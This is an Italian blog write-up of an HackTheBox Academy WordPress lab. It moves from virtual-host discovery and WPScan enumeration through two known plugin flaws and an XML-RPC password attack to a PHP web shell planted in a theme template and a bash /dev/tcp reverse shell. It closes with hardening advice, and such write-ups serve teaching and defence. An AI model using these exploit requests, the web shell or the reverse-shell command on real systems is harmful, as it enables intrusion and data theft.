---
title: "WordPress Penetration Testing: dall'enumerazione alla reverse shell"
date: 2026-10-29 10:30:00 +0200
categories: [Sicurezza]
image: /assets/img/wordpress/cover.png
description: "Write-up HTB Academy: dal sito pubblico al virtual host WordPress, enumerazione con WPScan, due plugin vulnerabili (download non autenticato e LFI), fino alla RCE e a una reverse shell."
published: true
---

Una pagina web può sembrare innocua finché non si comincia a guardare cosa espone davvero. Nel laboratorio di **HTB Academy – WordPress Skills Assessment** sono partito dal sito pubblico di una società di trasporti e ho seguito una catena che mi ha portato a individuare un blog WordPress, enumerarne le componenti, verificare vulnerabilità reali e ottenere una shell sul server.

La parte interessante non è stata soltanto arrivare a `www-data`. È stato capire **perché alcuni strumenti non vedevano WordPress**, come più metodi indipendenti confermassero la versione del CMS e in che modo piccoli problemi di configurazione potessero sommarsi fino a diventare un accesso al sistema operativo.

**Il percorso, in breve:** sito pubblico → virtual host WordPress → WPScan e analisi manuale → plugin vulnerabili → accesso al pannello → esecuzione di comandi → reverse shell.

> **Ambiente autorizzato.** Tutte le attività sono state eseguite esclusivamente sul target temporaneo dell’assessment HTB Academy. Gli indirizzi IP, i nomi utente e le credenziali citati appartengono al laboratorio. Le tecniche riportate servono a documentare un test autorizzato e a comprenderne le contromisure.

## 1. Il punto di partenza: target e ricognizione HTTP

Per il test ho utilizzato la **Pwnbox Parrot Linux** di HTB, collegata alla macchina `10.129.2.37`. L’obiettivo dell’assessment era analizzare il sito di Inlanefreight e arrivare a un accesso shell sul web server.

Aprendo `http://10.129.2.37/` in Firefox, il primo elemento che ho visto è stato un normale sito aziendale, con una home page dedicata ai servizi di trasporto. Nessun riferimento evidente a un pannello WordPress: perciò ho iniziato dalla risposta HTTP.

![La home pubblica di Inlanefreight, raggiunta tramite indirizzo IP.](/blog/assets/img/wordpress/homepage.png)
*Figura 1 — La home pubblica di Inlanefreight, raggiunta tramite indirizzo IP*

```bash
curl -I http://10.129.2.37/
```

Il server ha risposto con **`HTTP/1.1 200 OK`** e con l’intestazione **`Server: Apache/2.4.29 (Ubuntu)`**. Questo dato identifica il software dichiarato dal server, non la versione di WordPress e nemmeno, da solo, una vulnerabilità.

![Prima ricognizione HTTP: la risposta 200 OK e l’header Apache/2.4.29 (Ubuntu).](/blog/assets/img/wordpress/headers.png)
*Figura 2 — Prima ricognizione HTTP: la risposta 200 OK e l’header Apache/2.4.29 (Ubuntu)*

### Gobuster: il risultato negativo è comunque utile

Ho quindi usato **Gobuster** per cercare directory e file comuni sul sito principale:

```bash
gobuster dir -u http://10.129.2.37/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x html,txt,php -t 10
```

Sono emersi percorsi come `/about.html`, `/contact.html`, `/css`, `/images`, `/index.html` e `/services.html`, oltre a file o directory protetti da `403`. **Non è comparsa l’installazione WordPress.** Questo non dimostra che WordPress non esista: Gobuster stava interrogando il contenuto pubblicato sul nome di host raggiunto tramite IP, mentre il blog era servito da un **virtual host differente**.

![Gobuster individua risorse del sito principale, ma non il WordPress ospitato sul virtual host.](/blog/assets/img/wordpress/gobuster.png)
*Figura 3 — Gobuster individua risorse del sito principale, ma non il WordPress ospitato sul virtual host*

## 2. Il passaggio decisivo: trovare il virtual host

Cliccando sul collegamento “Blog” nella home, però, la pagina non si apriva: non veniva visualizzata. Ho capito così che il link non puntava a una risorsa dello stesso sito, ma a un indirizzo che il mio ambiente non riusciva a mostrare. Per capire dove puntasse davvero, ho filtrato il sorgente della home con `curl` e `grep`:

```bash
curl -s http://10.129.2.37/ \
  | grep -Ei 'blog|wp-content|wp-includes|wordpress|generator' \
  | head -n 20
```

Tra le righe restituite è apparso:

```html
<a href="http://blog.inlanefreight.local">Blog</a>
```

Era il dettaglio che mancava. **`blog.inlanefreight.local`** non era automaticamente risolvibile dall’ambiente di laboratorio: il browser non poteva raggiungerlo attraverso la normale risoluzione DNS. Ho quindi associato il nome all’IP fornito da HTB nel file locale `/etc/hosts`.

![Nel codice HTML della home compare il collegamento al virtual host blog.inlanefreight.local.](/blog/assets/img/wordpress/link-blog.png)
*Figura 4 — Nel codice HTML della home compare il collegamento al virtual host blog.inlanefreight.local*

```bash
echo '10.129.2.37 blog.inlanefreight.local' | sudo tee -a /etc/hosts
```

![Aggiunta del nome blog.inlanefreight.local a /etc/hosts nella Pwnbox.](/blog/assets/img/wordpress/hosts.png)
*Figura 5 — Aggiunta del nome blog.inlanefreight.local a /etc/hosts nella Pwnbox*

Riaprendo `http://blog.inlanefreight.local/` sono arrivato all’**Inlanefreight Employee Portal**. Questa volta la pagina era diversa: stavo parlando con il virtual host corretto e potevo finalmente analizzare WordPress.

![Il blog WordPress è finalmente raggiungibile dopo la risoluzione locale del nome.](/blog/assets/img/wordpress/blog.png)
*Figura 6 — Il blog WordPress è finalmente raggiungibile dopo la risoluzione locale del nome*

**Prima lezione:** uno scanner di directory non sostituisce la comprensione dei collegamenti HTML, dei nomi DNS e dell’header HTTP `Host`. Un risultato negativo sul sito principale può dipendere semplicemente dal fatto che stiamo interrogando il sito sbagliato.

## 3. Quale versione di WordPress è installata?

Per ricavare la versione del CMS ho utilizzato **WPScan, Wappalyzer e il sorgente della pagina**. I risultati si sono confermati a vicenda: il blog eseguiva **WordPress 5.1.6**.

### Metodo 1 — WPScan

Il primo comando è stato:

```bash
wpscan --url http://blog.inlanefreight.local/ --plugins-detection passive
```

WPScan ha raccolto informazioni dagli header e dalle risorse pubbliche. Nelle prime righe ha segnalato **Apache/2.4.29**, l’esposizione di **XML-RPC** e il directory listing sulla cartella degli upload. Più avanti ha identificato la versione WordPress **5.1.6**, specificando la fonte: **`Rss Generator (Passive Detection)`**.

![Avvio di WPScan sul virtual host corretto; il report segnala anche XML-RPC e le intestazioni HTTP.](/blog/assets/img/wordpress/wpscan-start.png)
*Figura 7 — Avvio di WPScan sul virtual host corretto; il report segnala anche XML-RPC e le intestazioni HTTP*

![WPScan identifica WordPress 5.1.6 dal feed RSS e il tema Twenty Nineteen.](/blog/assets/img/wordpress/wpscan-version.png)
*Figura 8 — WPScan identifica WordPress 5.1.6 dal feed RSS e il tema Twenty Nineteen*

Il dettaglio è importante: WPScan non sta “indovinando” la versione. In questo caso l’ha letta da un’informazione pubblicata nei feed RSS, per esempio un elemento `generator` riferito a WordPress `5.1.6`. Quando la versione è visibile in chiaro, la rilevazione passiva è spesso sufficiente.

### Metodo 2 — Wappalyzer

Ho poi aperto il blog con **Wappalyzer**, l’estensione del browser che riconosce le tecnologie web. Il pannello mostrava **WordPress 5.1.6** e altre componenti, tra cui Apache, MySQL e librerie JavaScript.

![Verifica indipendente tramite Wappalyzer: WordPress 5.1.6 e altre tecnologie esposte dal sito.](/blog/assets/img/wordpress/wappalyzer.png)
*Figura 9 — Verifica indipendente tramite Wappalyzer: WordPress 5.1.6 e altre tecnologie esposte dal sito*

Wappalyzer è utile come riscontro rapido, ma non sostituisce una verifica diretta: lavora su firme e indizi individuati nelle pagine e può non rilevare tutto ciò che è installato sul server.

### Metodo 3 — Sorgente HTML, CSS e JavaScript

Infine ho aperto il sorgente HTML (`Ctrl+U`) e cercato i riferimenti a `wp-includes`, `wp-content` e ai parametri `?ver=`. Nel mio caso apparivano risorse come:

```html
.../wp-includes/css/dist/block-library/style.min.css?ver=5.1.6
.../wp-includes/js/jquery/jquery.js?ver=1.12.4
.../wp-content/themes/twentynineteen/style.css?ver=1.3
```

![Sorgente HTML: percorsi wp-includes, wp-content, CSS e JavaScript con parametri di versione.](/blog/assets/img/wordpress/source.png)
*Figura 10 — Sorgente HTML: percorsi wp-includes, wp-content, CSS e JavaScript con parametri di versione*

Qui bisogna leggere i numeri con attenzione. **`5.1.6`** associato a risorse del core è un indizio della versione WordPress; **`1.12.4`** in `jquery.js` riguarda la libreria JavaScript, mentre **`1.3`** nello stylesheet del tema indica la versione dell’asset o del tema, non quella del CMS. Il parametro `ver` è quindi **un indizio, non una prova universale**: la sua interpretazione dipende dal file a cui è associato.

Si può ripetere il controllo anche da terminale:

```bash
curl -s 'http://blog.inlanefreight.local/?feed=rss2' \
  | grep -i 'generator'

curl -s http://blog.inlanefreight.local/ \
  | grep -Ei 'wp-includes|wp-content|[?&]ver='
```

La prima verifica cerca il generatore del feed, la seconda esamina gli URL degli asset. **Non tutte queste risorse sono sempre esposte**, ma confrontare più fonti riduce il rischio di attribuire al sito una versione sbagliata.

## 4. Tema, plugin e superfici esposte

Una volta identificato il core, ho allargato l’enumerazione ai componenti installati. WPScan ha individuato il tema attivo **Twenty Nineteen**, versione **1.3**, e diversi plugin. Tra quelli rilevanti per il laboratorio:

| Componente | Versione emersa | Ruolo nell’analisi |
|---|---:|---|
| WordPress Core | **5.1.6** | Versione del CMS |
| Twenty Nineteen | **1.3** | Tema attivo |
| Email Subscribers | **4.2.2** | Verifica di download non autenticato |
| Site Editor | **1.1.1** | Verifica di Local File Inclusion |
| The Events Calendar | **5.1.2.1** | Componente individuato durante l’enumerazione |

![Enumerazione dei plugin installati, con versioni rilevate e readme consultati.](/blog/assets/img/wordpress/plugins.png)
*Figura 11 — Enumerazione dei plugin installati, con versioni rilevate e readme consultati*

È utile distinguere **versione individuata**, **software non aggiornato** e **vulnerabilità dimostrata**. Un avviso “out of date” non equivale automaticamente alla riuscita di un exploit. In questo assessment, invece, per due plugin sono riuscito a ottenere una risposta concreta del server che dimostrava l’esposizione.

### Directory indexing: quando il server mostra il contenuto delle cartelle

WPScan aveva segnalato anche un’altra configurazione rischiosa: il **directory listing** in `/wp-content/uploads/`. Aprendo direttamente la directory nel browser, Apache ne mostrava l’indice, con cartelle come `2020`, `2024`, `2026`, `siteeditor` e il file **`upload_flag.txt`**.

![Directory indexing attivo su /wp-content/uploads/: è visibile anche upload_flag.txt.](/blog/assets/img/wordpress/listing.png)
*Figura 12 — Directory indexing attivo su /wp-content/uploads/: è visibile anche upload_flag.txt*

In un’installazione correttamente configurata, l’assenza di una pagina indice non dovrebbe esporre automaticamente l’elenco dei file. Qui la directory era navigabile: è il tipo di comportamento che rende più semplice scoprire file caricati, backup e dati non destinati alla pubblicazione.

Nel riepilogo dell’assessment questo controllo corrisponde a una flag dedicata; **lo screenshot allegato documenta l’esposizione del file**, non l’apertura del suo contenuto.

## 5. Enumerazione degli utenti: WPScan e controlli manuali

La fase successiva è stata capire quali account fossero riconoscibili dall’esterno. L’enumerazione di WPScan ha segnalato **`erika`**, **`admin`** e il nome visualizzato **`Charlie Wiggins`**.

![WPScan elenca erika, admin e il nome visualizzato Charlie Wiggins.](/blog/assets/img/wordpress/users.png)
*Figura 13 — WPScan elenca erika, admin e il nome visualizzato Charlie Wiggins*

WPScan ha associato i risultati a più tecniche: informazioni negli articoli, feed RSS, identificatori autore e messaggi di login. Questo spiega perché l’enumerazione degli utenti non dipenda necessariamente dalla presenza di un elenco pubblico sul sito.

Per verificare manualmente la stessa superficie si possono esaminare i redirect degli autori:

```bash
curl -I 'http://blog.inlanefreight.local/?author=1'
```

Oppure, se l’endpoint è esposto dalla configurazione, si può consultare la REST API:

```bash
curl -s 'http://blog.inlanefreight.local/wp-json/wp/v2/users' | jq
```

Questi sono **due controlli manuali complementari** descritti dal modulo: nel mio fascicolo fotografico, però, **il risultato verificato dell’enumerazione utenti è quello di WPScan**. Inoltre, un nome visualizzato come “Charlie Wiggins” non va automaticamente confuso con lo username utilizzabile per il login.

## 6. Primo plugin vulnerabile: download senza autenticazione

Ho esaminato il comportamento del plugin **Email Subscribers 4.2.2**, che nel laboratorio esponeva un percorso di esportazione dei contatti senza richiedere un’autenticazione valida. La richiesta era:

```bash
curl -i 'http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all'
```

Il server ha risposto **`200 OK`** con un allegato denominato **`all-contacts.csv`**. Nel contenuto CSV era presente anche il valore della flag dell’assessment.

Non si tratta di un comportamento isolato, ma di una vulnerabilità pubblica e catalogata: **CVE-2019-19985** — *«Email Subscribers & Newsletters ≤ 4.2.2 – Unauthenticated File Download / Information Disclosure»* — per la quale esiste un exploit documentato su **[Exploit-DB (EDB-ID 48698)](https://www.exploit-db.com/exploits/48698)**. L’endpoint `admin.php?page=download_report` restituisce il report (`report=users`) senza una verifica di autenticazione valida: è esattamente ciò che ho osservato.

![Download non autenticato di un report CSV tramite il plugin vulnerabile.](/blog/assets/img/wordpress/csv.png)
*Figura 14 — Download non autenticato di un report CSV tramite il plugin vulnerabile*

Questo è il punto decisivo: **non mi sono limitato a leggere una scheda di vulnerabilità**. Ho osservato un file effettivamente restituito dal server a una richiesta non autenticata. In un sito reale, un report di contatti o iscritti potrebbe contenere dati personali e diventare una violazione di riservatezza.

## 7. Secondo plugin vulnerabile: leggere file locali con una LFI

L’altro componente interessante era **Site Editor 1.1.1**. Ho verificato una **Local File Inclusion (LFI)** attraverso un endpoint PHP del plugin che accettava un percorso controllato nella richiesta.

Nel laboratorio la richiesta al file `ajax_shortcode_pattern.php`, con il parametro `ajax_path` che risaliva alle directory superiori fino a `/etc/passwd`, ha restituito il contenuto del file di sistema.

Anche questa è una vulnerabilità nota e catalogata: **CVE-2018-7422** — *«Site Editor ≤ 1.1.1 – Local File Inclusion»* — con un exploit pubblico su **[Exploit-DB (EDB-ID 44340)](https://www.exploit-db.com/exploits/44340)**. La falla è proprio nell’endpoint `ajax_shortcode_pattern.php`, che utilizza il parametro `ajax_path` senza sanificarlo, permettendo di includere file arbitrari del server.

![LFI nel plugin Site Editor: risposta del server contenente /etc/passwd.](/blog/assets/img/wordpress/lfi.png)
*Figura 15 — LFI nel plugin Site Editor: risposta del server contenente /etc/passwd*

Il risultato mostrava account Linux come `www-data`, `mysql`, `erika` e **`frank.mclane`**. La presenza di quest’ultimo rispondeva a una delle domande dell’assessment. Il file `/etc/passwd` consente di ricostruire identità, UID, home directory e shell configurate, ma **non contiene normalmente le password degli utenti**.

La LFI è stata quindi **confermata dal contenuto della risposta**, non semplicemente ipotizzata in base alla versione del plugin. Da sola, tuttavia, questa lettura non dimostrava ancora l’esecuzione di comandi sul server: per la shell ho seguito un percorso differente.

## 8. Dall’enumerazione al login WordPress

Tra gli account individuati mi sono concentrato su **`erika`**. Nell’assessment ho usato WPScan per testare l’autenticazione attraverso l’endpoint XML-RPC con una wordlist, ottenendo una combinazione valida.

La sintassi di WPScan per il test XML-RPC è:

```bash
wpscan --url http://blog.inlanefreight.local/ \
  --password-attack xmlrpc -U erika \
  -P /usr/share/wordlists/rockyou.txt
```

L’evidenza finale riporta **`[SUCCESS] - erika / 010203`**: in questo contesto si tratta di una password del laboratorio. È un esempio chiaro del pericolo di credenziali banali, soprattutto se abbinate a un endpoint di autenticazione esposto e privo di adeguate difese contro tentativi ripetuti.

![Nel laboratorio WPScan conferma una combinazione valida per l’account erika.](/blog/assets/img/wordpress/credentials.png)
*Figura 16 — Nel laboratorio WPScan conferma una combinazione valida per l’account erika*

**Importante:** XML-RPC non è una vulnerabilità di per sé. Il problema nasce dalla combinazione di **password debole**, possibilità di effettuare tentativi e assenza o insufficienza di misure difensive come rate limiting e autenticazione multifattore.

## 9. Dall’accesso amministrativo alla Remote Code Execution

Dopo l’accesso al pannello WordPress, ho aperto **Aspetto → Editor del tema**. L’installazione permetteva di modificare file PHP direttamente dalla dashboard. Ho scelto il tema **Twenty Seventeen**, non attivo, e il suo template **`404.php`**, per non alterare la grafica principale del portale.

All’inizio del file ho inserito, solo per il laboratorio, una condizione che eseguisse il comando passato nel parametro `cmd`:

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
    exit;
}
```

![Editor del tema inattivo Twenty Seventeen: modifica del template 404.php nel laboratorio.](/blog/assets/img/wordpress/editor.png)
*Figura 17 — Editor del tema inattivo Twenty Seventeen: modifica del template 404.php nel laboratorio*

La verifica è stata diretta:

```text
http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=id
```

La pagina ha restituito:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![La richiesta al template modificato esegue id come utente www-data.](/blog/assets/img/wordpress/rce.png)
*Figura 18 — La richiesta al template modificato esegue id come utente www-data*

A quel punto avevo dimostrato una **Remote Code Execution** nel contesto del web server. Non era un accesso root: il processo PHP eseguiva i comandi come **`www-data`**, l’utente del servizio web. Ma era sufficiente per completare l’obiettivo successivo.

## 10. Reverse shell: dal comando remoto alla sessione interattiva

Eseguire `id` tramite una pagina web è una prova importante, ma lavorare attraverso il browser è scomodo. Per ottenere una shell ho avviato un listener sulla Pwnbox, all’indirizzo **`10.10.15.160`**, porta **`4444`**:

```bash
nc -lvnp 4444
```

In un secondo terminale ho inviato al template modificato un comando Bash che aprisse una connessione TCP verso il listener:

```bash
curl -G \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.15.160/4444 0>&1'" \
  'http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php'
```

La connessione è arrivata da **`10.129.2.37`** alla porta **`4444`**. Il terminale ha mostrato i messaggi `no job control in this shell` e `cannot set terminal process group`: non indicavano un fallimento, ma semplicemente una shell Bash priva di un terminale TTY completo.

![La connessione reverse raggiunge il listener sulla Pwnbox, porta 4444.](/blog/assets/img/wordpress/reverse.png)
*Figura 19 — La connessione reverse raggiunge il listener sulla Pwnbox, porta 4444*

### Verifica della sessione

Una volta dentro ho controllato identità, sistema e directory corrente:

```bash
whoami
id
hostname
pwd
```

La shell restituiva **`www-data`**, con **`uid=33`**, host **`nix01`** e working directory sotto:

```text
/var/www/blog.inlanefreight.local/public_html/wp-content/themes/twentyseventeen
```

![La shell è verificata con whoami, id, hostname e pwd.](/blog/assets/img/wordpress/post.png)
*Figura 20 — La shell è verificata con whoami, id, hostname e pwd*

Queste verifiche sono essenziali anche nella scrittura del report: **una connessione riuscita non basta a dichiarare il livello di accesso ottenuto**. Serve documentare quale account sta realmente eseguendo i comandi.

## 11. L’ultima verifica: la flag nella home di Erika

Con la shell attiva ho ispezionato la directory prevista dall’assessment:

```bash
ls -la /home/erika/
```

Tra i file ho individuato **`d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt`**. L’output mostrava che il file apparteneva a `root:root`, ma aveva permessi **`-rw-r--r--`**, quindi risultava potenzialmente leggibile anche da `www-data`.

![Nel percorso /home/erika/ è individuato un file _flag.txt; qui non ne è ancora mostrato il contenuto.](/blog/assets/img/wordpress/flagfinal.png)
*Figura 21 — Nel percorso /home/erika/ è individuato un file _flag.txt; qui non ne è ancora mostrato il contenuto*

**Qui è importante non attribuirmi un passaggio che la schermata non mostra:** ho documentato **la presenza e i permessi del file**, ma **non ho salvato l’output della sua lettura**. Per completare l’evidenza finale dell’ottava domanda occorrerebbe documentare anche il contenuto restituito, ad esempio attraverso una lettura mirata del file nel laboratorio.

È anche una lezione sulla gestione dei permessi Linux: **essere proprietario di un file non è la stessa cosa che esserne l’unico lettore**. Un file `root:root` con il bit di lettura per “others” può comunque essere letto da un processo non privilegiato.

## 12. Come difendersi: la catena si spezza in più punti

Questo assessment non mostra una sola vulnerabilità “magica”. Mostra piuttosto una catena di esposizioni, misconfigurazioni e credenziali deboli. La difesa efficace consiste nell’interrompere **più di un anello**.

### Ridurre le informazioni e i file esposti

Disabilitare il **directory indexing**, rimuovere backup e report dalle cartelle pubbliche, limitare l’accesso agli endpoint che restituiscono dati, e distinguere bene tra file realmente destinati alla pubblicazione e file interni. L’enumerazione degli utenti, da sola, non equivale a compromissione: rende però più semplice scegliere bersagli per attacchi alle credenziali.

### Aggiornare il core e i componenti

Mantenere **WordPress, plugin e temi** aggiornati; eliminare quelli inutilizzati anziché lasciarli soltanto disattivati. Controllare gli avvisi di sicurezza relativi alle versioni in uso, senza confondere “software vecchio” con “vulnerabilità sfruttata”. Un inventario affidabile è la prima difesa contro componenti dimenticati.

### Proteggere l’autenticazione

Usare password robuste e univoche, **MFA** sugli account amministrativi, rate limiting e registrazione dei tentativi di accesso. Se XML-RPC non serve, restringerne l’esposizione in modo compatibile con le funzionalità effettivamente usate dal sito. La debolezza fondamentale osservata qui non era l’esistenza di XML-RPC, ma la combinazione con una password banale.

### Nascondere la versione e spostare la pagina di login

Due accorgimenti riducono il *fingerprinting* e gli attacchi automatizzati al login.

**1. Nascondere la versione di WordPress.** Da sola non è una difesa (vale il principio della *security through obscurity*), ma rende meno immediato capire quale versione — e quindi quali exploit — provare. In un *child theme* (`functions.php`) o in un piccolo *mu-plugin*:

```php
// Rimuove il meta <generator> e la versione dai feed RSS
remove_action('wp_head', 'wp_generator');
add_filter('the_generator', '__return_empty_string');

// Rimuove il parametro ?ver= da CSS e JS (riduce il fingerprinting degli asset)
function ilf_strip_ver($src) { return $src ? remove_query_arg('ver', $src) : $src; }
add_filter('style_loader_src',  'ilf_strip_ver', 9999);
add_filter('script_loader_src', 'ilf_strip_ver', 9999);
```

È utile anche impedire l'accesso a `readme.html` e `license.txt` (riportano la versione) e, se XML-RPC non serve, limitarne l'esposizione. Attenzione: come visto nell'assessment, la versione può trapelare anche dal feed RSS e dagli URL degli asset — quindi questa misura va **sempre** accompagnata dagli aggiornamenti, non la sostituisce.

**2. Spostare la pagina di login.** `wp-login.php` è un bersaglio noto per gli attacchi alle credenziali e per l'enumerazione tramite XML-RPC. Il modo più semplice e robusto è un plugin come **WPS Hide Login**, che sposta il login su un percorso personalizzato (es. `/area-riservata`) e restituisce `404` su `wp-login.php` e `wp-admin` agli utenti non autenticati.

Se preferisci agire a livello di web server, puoi aggiungere una protezione extra con `.htaccess`, mettendo un'autenticazione HTTP davanti al login:

```apache
<Files wp-login.php>
  AuthType Basic
  AuthName "Area riservata"
  AuthUserFile /percorso/protetto/.htpasswd
  Require valid-user
</Files>
```

Nessuna di queste misure sostituisce password robuste e MFA, ma riduce in modo concreto i tentativi automatizzati: un bot che non trova `wp-login.php` non può nemmeno iniziare un attacco a dizionario.

### Togliere al pannello la possibilità di modificare codice PHP

WordPress permette di disabilitare l’editor di temi e plugin dal pannello con questa impostazione in `wp-config.php`:

```php
define('DISALLOW_FILE_EDIT', true);
```

In più, i file PHP dei temi e dei plugin **non dovrebbero essere scrivibili dal processo web**, salvo esigenze specifiche e controllate. Il codice andrebbe distribuito tramite un processo di deploy separato, anziché modificato direttamente dal browser. Questa raccomandazione è coerente con le indicazioni ufficiali di hardening WordPress.

### Contenere il server compromesso

Applicare il principio del **minimo privilegio** al processo web e alle credenziali di database; segmentare i servizi; impedire l’esecuzione di script negli upload quando non necessaria; monitorare modifiche ai file PHP, richieste anomale e connessioni in uscita inattese. In caso di compromissione, occorre acquisire le evidenze, ripristinare i file alterati, verificare eventuale persistenza e ruotare le credenziali esposte.

## Conclusioni

La lezione principale è che **l’enumerazione fatta bene cambia completamente il risultato di un test**. All’inizio Gobuster non mostrava alcun WordPress. È bastato leggere il codice HTML, capire il ruolo del virtual host e ripetere gli stessi controlli sul dominio corretto per scoprire un’intera superficie di attacco.

Da lì, gli indizi si sono trasformati in prove: la versione del CMS è stata confermata da tre fonti, i plugin hanno restituito file che non avrebbero dovuto essere disponibili e l’accesso amministrativo ha permesso di intervenire su un template PHP. Alla fine, il processo web rispondeva a una shell remota.

**Il risultato non dipende da un solo comando, ma dall’ordine delle domande che mi pongo.** Quale sito sto interrogando? Che cosa rivela? Quali componenti sono davvero presenti? Quello che sembra vulnerabile lo è anche nei fatti? Solo dopo aver risposto con evidenze ha senso passare al livello successivo.

> **Nota di chiusura.** Nel laboratorio la modifica a `404.php` era necessaria per dimostrare l’RCE. Dopo la raccolta delle prove, in un test autorizzato si deve ripristinare il file originale e rimuovere qualsiasi meccanismo di accesso introdotto durante l’attività.

## Riferimenti e approfondimenti

- [HTB Academy – WordPress Enumeration & Exploitation](https://academy.hackthebox.com/app/module/17/overview)
- [WPScan – Documentazione ufficiale](https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation)
- [Exploit-DB 48698 – Email Subscribers & Newsletters 4.2.2: Unauthenticated File Download (CVE-2019-19985)](https://www.exploit-db.com/exploits/48698)
- [Exploit-DB 44340 – Site Editor 1.1.1: Local File Inclusion (CVE-2018-7422)](https://www.exploit-db.com/exploits/44340)
- [WordPress – Hardening WordPress](https://developer.wordpress.org/advanced-administration/security/hardening/)
- [WordPress – Configurazione e DISALLOW_FILE_EDIT](https://developer.wordpress.org/advanced-administration/wordpress/wp-config/)
- [Gobuster – Repository ufficiale](https://github.com/OJ/gobuster)
- [Wappalyzer](https://www.wappalyzer.com/)
- [MITRE ATT&CK – Exploit Public-Facing Application (T1190)](https://attack.mitre.org/techniques/T1190/)
